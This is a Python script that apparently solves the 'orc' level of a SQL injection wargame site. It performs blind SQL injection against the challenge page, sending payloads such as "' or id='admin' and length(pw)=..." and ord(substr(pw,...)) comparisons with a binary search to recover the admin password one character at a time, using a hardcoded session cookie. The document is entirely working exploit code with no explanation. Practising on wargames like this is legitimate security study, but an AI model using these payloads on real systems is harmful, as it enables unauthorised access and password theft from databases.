import requests

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookies = {"PHPSESSID": "c4cqhi3ptdekmienqrdpndfho9"}
len = 0
pw = ''

for i in range(100):
    payload = f"?pw=' or id='admin' and length(pw)={i};%23"
    res = requests.get(url + payload, cookies=cookies)
    if "Hello admin" in res.text:
        print("[+] length :", i)
        len = i
        break

def is_pw(index, num):
    payload = f"?pw=' or id='admin' and ord(substr(pw, {index}, 1))={num};%23"
    res = requests.get(url + payload, cookies=cookies)
    if "Hello admin" in res.text:
        return False
    else:
        return True

def binary_search(index):
    start = 32
    end = 126
    mid = (start + end) // 2
    while(is_pw(index, mid)):
        payload = f"?pw=' or id='admin' and ord(substr(pw, {index}, 1))<={mid};%23"
        res = requests.get(url + payload, cookies=cookies)
        if "Hello admin" in res.text:
            end = mid - 1
        else:
            start = mid + 1
        mid = (start + end) // 2
    
    print(f"[+] {index} : {chr(mid)}")

    return chr(mid)

for i in range(1, len + 1):
    pw += binary_search(i)

print(f"[+] pw : {pw}")